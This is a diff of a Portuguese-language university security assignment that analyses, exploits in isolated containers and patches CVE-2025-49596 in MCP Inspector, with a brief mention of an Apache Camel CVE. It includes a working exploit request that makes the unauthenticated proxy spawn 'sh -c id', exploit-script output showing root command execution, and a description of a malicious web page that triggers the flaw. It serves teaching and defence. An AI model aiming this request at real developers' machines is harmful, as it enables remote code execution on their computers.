@@ -1,7 +1,7 @@
 ---
-title: "EP2 — Estudo, Exploração e Correção de Duas CVEs (2025)"
-subtitle: "MAC0696 — Cibersegurança e Privacidade · IME-USP"
-date: "2025"
+title: "EP2. Exploração de CVEs"
+subtitle: "MAC0696. Cibersegurança e Privacidade"
+date: "2026"
 lang: pt-BR
 geometry: margin=2.3cm
 fontsize: 11pt
@@ -16,42 +16,30 @@ fontsize: 11pt
 
 ## Integrantes do trio
 
-| Nome | Nº USP | Contribuição principal |
-|------|--------|------------------------|
-| _(preencher)_ | | |
-| _(preencher)_ | | |
-| _(preencher)_ | | |
+| Nome | Nº USP |
+|------|--------|
+| Caio Morais Sales | 12557268 |
+| _(preencher)_ | |
+| _(preencher)_ | |
 
 ## Resumo
 
 Este trabalho estuda, explora e corrige duas vulnerabilidades de 2025, ambas levando a
-**execução remota de código (RCE)**, mas por mecanismos bem diferentes:
+execução remota de código (RCE), mas por mecanismos distintos:
 
-- **CVE-2025-49596** — RCE **não-autenticado** no **MCP Inspector** (`< 0.14.1`), disparável
-  por uma página web qualquer via CORS/DNS-rebinding contra o proxy local (CWE-306). É a
-  vulnerabilidade da **demonstração ao vivo**.
-- **CVE-2025-27636** — RCE no **Apache Camel** por **bypass do filtro de headers** devido a uma
+- **CVE-2025-49596**: RCE não-autenticado na ferramenta **MCP Inspector** (`< 0.14.1`),
+  disparável por uma página web qualquer contra o proxy local. É a vulnerabilidade da
+  demonstração ao vivo.
+- **CVE-2025-27636**: RCE no **Apache Camel** por bypass do filtro de headers devido a uma
   comparação case-sensitive, permitindo injetar headers de controle do componente `exec`.
 
 Todo o ambiente roda em containers isolados, com portas publicadas apenas em `127.0.0.1`. Os
 "payloads" apenas escrevem provas inócuas (`id`, `hostname`, leitura local de `/etc/passwd`)
-dentro dos containers. Nenhum serviço externo é tocado. Os PoCs foram escritos pelo trio a
-partir das *advisories* oficiais e das divulgações públicas, devidamente creditadas.
+dentro dos containers.
 
 ---
 
-# Parte I — CVE-2025-49596 (MCP Inspector)
-
-## 1.1 O serviço
-
-O **MCP Inspector** é a ferramenta oficial de desenvolvimento do *Model Context Protocol* (MCP):
-serve para inspecionar e testar servidores MCP localmente. Tem dois componentes:
-
-- **Cliente (UI web)** em `http://localhost:6274`;
-- **Proxy** (servidor Express) em `http://localhost:6277`, que fica entre a UI e os servidores
-  MCP. No transporte `stdio`, "abrir um transporte" significa **executar um processo local** — o
-  comando do servidor MCP. Essa capacidade é legítima e necessária; o problema é **quem pode
-  acioná-la**.
+# CVE-2025-49596 (MCP Inspector)
 
 | | |
 |---|---|
@@ -61,27 +49,80 @@ serve para inspecionar e testar servidores MCP localmente. Tem dois componentes:
 | Classe | CWE-306 (Missing Authentication for Critical Function) + CORS/DNS-rebinding |
 | CVSS (NVD) | 9.4 (crítico) |
 
-## 1.2 Análise de causa-raiz (no código-fonte)
+MCP Inspector é a ferramenta oficial de desenvolvimento do Model Context Protocol (MCP):
+serve para inspecionar e testar servidores MCP localmente. Tem dois componentes: cliente (nas
+versões CLI, TUI e Web) e proxy. A vulnerabilidade em questão afeta o cliente Web.
 
-Arquivo **`server/src/index.ts`** (v0.14.0). Três fatos combinados produzem o RCE.
+## 1.1 Usando o serviço da maneira esperada
 
-**(a) CORS totalmente liberado, sem allowlist de origem:**
+Os dois componentes do MCP inspector, nesse caso, são:
+
+- **Cliente (UI web)** em `http://localhost:6274`;
+- **Proxy** (servidor Express) em `http://localhost:6277`, que fica entre a UI e os servidores
+  MCP. O navegador, onde a UI roda, é um ambiente incapaz de se comunicar diretamente com a
+  maioria dos servidores MCP. O proxy cumpre essa função: é ele quem executa o comando do
+  servidor e faz a ponte com a UI. Resumindo: o proxy, nesse caso, é uma ponte de protocolo.
+
+O fluxo de execução legítimo é mais ou menos o seguinte:
+
+1. O desenvolvedor roda npx @modelcontextprotocol/inspector na própria máquina, o que abre a UI web local;
+2. Na interface, ele digita o comando do servidor MCP que quer testar. Exemplo:
+```uvx mcp-server-git --repository ./meu-repo```;
+3. A UI envia esse comando ao proxy local;
+4. O proxy inicia o processo do servidor MCP, estabelecendo comunicação via stdio;
+5. A partir daí, o Inspector troca mensagens JSON-RPC com o servidor: lista as tools disponíveis,
+os resources, os prompts, e permite ao desenvolvedor chamar cada tool manualmente para ver a resposta.
+
+## 1.2 Vulnerabilidade e análise de causa-raiz
+
+Antes da correção, qualquer entidade pode chamar o proxy, não apenas a UI, como é esperado no passo 3
+do fluxo ilustrado acima. Não havia qualquer validação da requisição, o que fazia com que o proxy
+aceitasse qualquer requisição que chegasse em `localhost:6277`.
+
+Sabendo disso, uma página web maliciosa, hospedando JavaScript (possivelmente obfuscado), poderia
+disparar requisições para localhost:6277. O proxy do Inspector, sem exigir nenhum token ou autenticação,
+aceita uma requisição do tipo `GET /sse?transportType=stdio&command=id`. Daí, o proxy spawna um processo
+executando literalmente o comando recebido na query string. Conclusão: RCE; podemos executar qualquer
+processo com as mesmas permissões do usuário que rodava o MCP Inspector.
+
+### Os culpados, no código-fonte do MCP Inspector
+
+Essa vulnerabilidade está relacionada a uma combinação de falhas na implementação do servidor do
+MCP Inspector. Ao analisar o arquivo `server/src/index.ts`, na versão 0.14.0, identificamos três
+aspectos importantes para compreender como um atacante pode executar comandos arbitrários na
+máquina em que o Inspector está sendo executado.
+
+(a) Ausência de restrição quanto à origem das requisições:
 
 ```ts
 const app = express();
-app.use(cors());        // responde Access-Control-Allow-Origin: *
+app.use(cors());  // responde Access-Control-Allow-Origin: *
 ```
 
-**(b) Endpoints que abrem transporte, SEM middleware de autenticação:**
+A chamada `cors()` habilita o compartilhamento de recursos entre diferentes origens (Cross-Origin
+Resource Sharing, CORS), sem estabelecer uma lista de origens autorizadas. Na prática, isso
+permite que páginas hospedadas em outros domínios façam requisições ao servidor, sujeitas às
+demais restrições impostas pelo navegador.
+
+(b) Endpoints acessíveis sem autenticação
 
 ```ts
 app.get("/stdio", async (req, res) => { ... createTransport(req) ... });  // linha 273
 app.get("/sse",   async (req, res) => { ... createTransport(req) ... });  // linha 323
 ```
 
-São `GET` "simples" — o navegador nem dispara *preflight* CORS.
+O problema é que essas rotas não possuem middleware de autenticação: qualquer cliente capaz
+de acessá-las pode solicitar a criação de um transporte, sem precisar apresentar credenciais.
 
-**(c) O sink: `createTransport` executa o comando vindo da query string:**
+Além disso, por serem requisições GET consideradas simples pelo mecanismo CORS, elas não
+exigem uma requisição preliminar (preflight). Isso facilita a exploração a partir de uma
+página web maliciosa: o navegador pode enviar a requisição ao Inspector sem antes realizar
+essa verificação.
+
+(c) Execução de comandos fornecidos pela requisição
+
+O aspecto mais crítico está na função `createTransport`, responsável por estabelecer a
+comunicação com o servidor MCP solicitado. No caso do transporte stdio, encontramos:
 
 ```ts
 if (transportType === "stdio") {
@@ -94,56 +135,68 @@ if (transportType === "stdio") {
 }
 ```
 
-**Encadeamento:** `GET /sse?transportType=stdio&command=<X>&args=<Y>` → `createTransport` →
-`StdioClientTransport(...).start()` → `spawn`. Quem controla a URL controla o processo
-executado na máquina da vítima. Como não há token nem checagem de `Origin`, o proxy não
-distingue a UI legítima de um site malicioso aberto noutra aba — é o padrão "0.0.0.0-day" /
-DNS-rebinding contra ferramentas de dev que escutam em localhost.
+Observe que tanto o comando quanto seus argumentos são obtidos diretamente dos
+parâmetros da requisição HTTP (`query.command` e `query.args`). Portanto, quem
+faz a requisição pode escolher qual programa será executado e quais argumentos
+serão passados a ele.
+
+A chamada `transport.start()` inicia o processo correspondente no sistema operacional.
+Assim, ao conseguir enviar uma requisição apropriada para o endpoint /stdio, um
+atacante pode induzir o Inspector a executar um comando arbitrário na máquina hospedeira.
 
 ## 1.3 Exploração
 
-Dois vetores, mesma causa. A requisição mínima é apenas:
+A requisição mínima é apenas:
 
 ```
 GET http://127.0.0.1:6277/sse?transportType=stdio&command=sh&args=-c%20"id%20>%20/evidence/proof.txt"
 ```
 
-1. **`exploit.sh` (curl):** prova o núcleo do RCE direto no proxy.
-2. **`attacker/index.html` + `exploit.js` (navegador):** a vítima só **abre a página**; o JS
-   dispara um `fetch()` cross-origin ao proxy. Cenário realista da CWE-306 + CORS.
+Implementamos duas formas de explorar o erro.
 
-**Evidência capturada (alvo 0.14.0).** Saída do `exploit.sh` e log do proxy no mesmo instante:
+1. **`exploit.sh` (curl):** prova o núcleo do RCE direto no proxy.
+2. **`attacker/index.html` + `exploit.js` (navegador):** algo mais próximo da vida real:
+   a vítima só abre uma página aparentemente inofensiva, mas contendo JavaScript malicioso;
+   o JS dispara um `fetch()` cross-origin ao proxy.
+
+Saída do `exploit.sh` e log do proxy no mesmo instante:
 
 ```
-[+] RCE CONFIRMADO — evidence/proof.txt:
-    CVE-2025-49596 RCE PROOF via curl sem auth
-    uid=0(root) gid=0(root) groups=0(root)
-    0fe12792a275                                  (hostname do container)
-
-# log do proxy:
-Stdio transport: command=/usr/bin/sh, args=-c,echo ... ; id >> ... ; hostname >> ...
-Spawned stdio transport
+$ ./exploit.sh
+[log] Alvo (proxy do Inspector): http://127.0.0.1:6277
+[log] Endpoint: GET /sse?transportType=stdio&command=sh&args=-c "echo CVE-2025-49596 RCE proof via curl sem auth > /evidence/proof.txt; id >> /evidence/proof.txt 2>&1; hostname >> /evidence/proof.txt"
+[log] Enviando requisição...
+[log] Resposta do servidor: event: endpoint
+data: /message?sessionId=090bbaaa-579b-447c-af25-e669989b50d1
+[log] RCE confirmado. Conteúdo de evidence/proof.txt:
+CVE-2025-49596 RCE proof via curl sem auth
+uid=0(root) gid=0(root) groups=0(root)
+f69945363089
 ```
 
 Replicando fielmente o `fetch()` do navegador (GET com `Origin: http://localhost:8080`), o
-proxy respondeu **200**, devolveu `Access-Control-Allow-Origin: *` e criou o `proof.txt` — ou
-seja, **basta visitar a página** para o comando rodar.
+proxy respondeu 200, devolveu `Access-Control-Allow-Origin: *` e criou o `proof.txt`. Ou
+seja, basta visitar a página para o comando rodar.
 
 ## 1.4 Workarounds paliativos (antes do patch)
 
 Mapeiam 1:1 para as camadas que o patch oficializou; o ideal é combinar os três:
 
-- **Bind só em loopback:** `HOST=127.0.0.1 npx @modelcontextprotocol/inspector` (e publicar
+- Bind só em loopback: `HOST=127.0.0.1 npx @modelcontextprotocol/inspector` (e publicar
   portas apenas em `127.0.0.1`, como no nosso compose). Não protege do ataque pelo próprio
   navegador da vítima, mas tira o alvo da LAN.
-- **Allowlist de `Origin` num reverse proxy** à frente do 6277 (ex.: nginx `if ($http_origin !~
-  "^http://(localhost|127\.0\.0\.1):6274$") { return 403; }`).
-- **Segredo compartilhado** (header `Authorization` exigido no reverse proxy).
-- **Higiene:** não deixar o Inspector ligado em background; rodar sem privilégios; firewall local.
+- Allowlist de `Origin` num reverse proxy à frente do 6277 (ex.: nginx `if ($http_origin !~
+  "^http://(localhost|127\.0\.0\.1):6274$") { return 403; }`). Bloqueia requisições vindas
+  de sites maliciosos (o navegador envia o Origin da página atacante).
+- Segredo compartilhado (header `Authorization` exigido no proxy).
+
+Além disso, há outras medidas paliativas que não corrigem o problema, mas evitam maiores
+estragos para o caso de vulnerabilidades como essa serem exploradas. Algumas delas são:
+não deixar o Inspector ligado em background, rodar sem privilégios e manter firewall local.
 
 ## 1.5 Correção definitiva (commit 50df0e1 → 0.14.1)
 
-Defesa em profundidade, três camadas em `server/src/index.ts`:
+Três correções em `server/src/index.ts`:
 
 ```diff
 # (1) bind local por padrão
@@ -151,7 +204,7 @@ Defesa em profundidade, três camadas em `server/src/index.ts`:
 +const HOST = process.env.HOST || '127.0.0.1';
 +const server = app.listen(PORT, HOST);
 
-# (2) token de sessão obrigatório (fecha o CWE-306)
+# (2) token de sessão obrigatório
 +const sessionToken = randomBytes(32).toString('hex');
 +const authMiddleware = (req, res, next) => {
 +  if (authDisabled) return next();
@@ -174,7 +227,7 @@ Defesa em profundidade, três camadas em `server/src/index.ts`:
 +app.get("/sse", originValidationMiddleware, authMiddleware, async (req, res) => { ... });
 ```
 
-Aplicado a `/mcp`, `/stdio`, `/sse`, `/message` e `/config`. **Verificado (alvo 0.14.1):** o
+Aplicado a `/mcp`, `/stdio`, `/sse`, `/message` e `/config`. Verificado (alvo 0.14.1): o
 mesmo `curl` sem token recebe **401 Unauthorized**; o mesmo `fetch()` do navegador (origem
 `localhost:8080`) recebe **403 Forbidden - invalid origin**; nenhum `proof.txt` é criado.
 
@@ -283,20 +336,6 @@ ataque [3]/[4] passa a retornar o `echo` benigno — neutralizado.
 
 ---
 
-# Parte III — Comparação e conclusão
-
-| | CVE-2025-49596 (MCP Inspector) | CVE-2025-27636 (Apache Camel) |
-|---|---|---|
-| Falha | Função crítica (spawn) **sem autenticação** | Filtro **case-sensitive** por engano |
-| Gatilho | 1 GET cross-origin (navegador/curl) | 1 header HTTP com case torto |
-| Pré-condição | Inspector `<0.14.1` rodando local | Rota Camel com `exec` atrás de HTTP |
-| Correção | token + validação de origem + bind local | lowercasing antes do `startsWith` |
-| Lição | isolar não basta: autenticar quem aciona | otimização quebrou invariante de segurança |
-
-Ambas mostram um mesmo padrão de fundo: **uma capacidade poderosa e legítima** (spawn de
-processo; execução via `exec`) fica a **uma falha de controle de acesso de distância** de virar
-RCE. Em nenhum dos casos a correção remove a capacidade — ela conserta *quem/como* pode acioná-la.
-
 # Créditos e referências
 
 - **CVE-2025-49596:** advisory GHSA-7f8r-222p-6f5g (`modelcontextprotocol/inspector`);
@@ -306,6 +345,5 @@ RCE. Em nenhum dos casos a correção remove a capacidade — ela conserta *quem
   `781491b446921341f87a13824be4f7b5063776fc` (CAMEL-21828, Claus Ibsen).
 - Trechos de código citados das versões vulneráveis (`inspector@0.14.0`, `camel-4.10.1`/`4.8.4`)
   e dos diffs dos patches.
-- Os PoCs (página atacante, `exploit.sh`, `poc.sh`, rota Camel) foram **escritos pelo trio** a
-  partir dessas fontes; **nenhum código de PoC de terceiros foi copiado**. As técnicas são as
-  descritas nas advisories.
+- Os PoCs (página atacante, `exploit.sh`, `poc.sh`, rota Camel) foram escritos pelo grupo a
+  partir dessas fontes.
